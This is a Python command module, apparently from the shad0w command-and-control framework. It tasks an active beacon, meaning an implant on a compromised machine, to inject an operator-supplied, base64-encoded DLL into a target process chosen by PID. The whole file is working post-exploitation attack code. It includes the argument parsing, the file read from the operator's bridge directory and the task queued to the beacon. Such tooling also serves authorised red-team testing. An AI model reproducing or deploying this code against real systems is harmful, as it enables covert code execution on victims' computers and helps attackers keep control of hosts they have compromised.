#
# Inject a DLL into a process
#

import os
import json
import base64
import argparse

__description__ = "Inject a DLL into a process"
__author__ = "@_batsec_"

# identify the task as dll injection
DLLINJECT_EXEC_ID = 0x5000

# did the command error
ERROR = False
error_list = ""

# let argparse error and exit nice

def error(message):
    global ERROR, error_list
    ERROR = True
    error_list += f"\033[0;31m{message}\033[0m\n"

def exit(status=0, message=None):
    if message != None: print(message)
    return

def build_inject_info(args, rcode):

    # create the json object to tell the beacon
    # where to execute the code.

    info = {}

    info["pid"] = int(args.pid)
    info["dll"] = rcode

    return json.dumps(info)

def get_file_data(filename):

    # get the data from the file

    # so we are in the bridge
    bdir = os.getcwd()
    os.chdir("/root/shad0w/.bridge")

    try:
        with open(filename, 'rb') as file:
            data = file.read()
    except FileNotFoundError:
        return None

    # hop back to where we where before
    os.chdir(bdir)

    return base64.b64encode(data).decode()

def main(shad0w, args):

    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.log("ERROR: No active beacon", log=True)
        return

    # usage examples
    usage_examples = """

Examples:

dllinject -p 4267 -f yourfile.dll
"""

    # init argparse
    parse = argparse.ArgumentParser(prog='dllinject',
                                    formatter_class=argparse.RawDescriptionHelpFormatter,
                                    epilog=usage_examples)

    # keep it behaving nice
    parse.exit = exit
    parse.error = error

    # set the args
    parse.add_argument("-p", "--pid", required=True, help="PID of the process")
    parse.add_argument("-f", "--file", required=True, help="The DLL to inject")

    # make sure we dont die from weird args
    try:
        args = parse.parse_args(args[1:])
    except:
        pass

    # show the errors to the user
    if ERROR:
        print(error_list)
        parse.print_help()
        return

    rcode = get_file_data(args.file)
    if rcode == None:
        shad0w.debug.error(f"DLL '{args.file}' does not exist")
        return

    inject_info = build_inject_info(args, rcode)

    shad0w.beacons[shad0w.current_beacon]["task"] = (DLLINJECT_EXEC_ID, inject_info)

    return
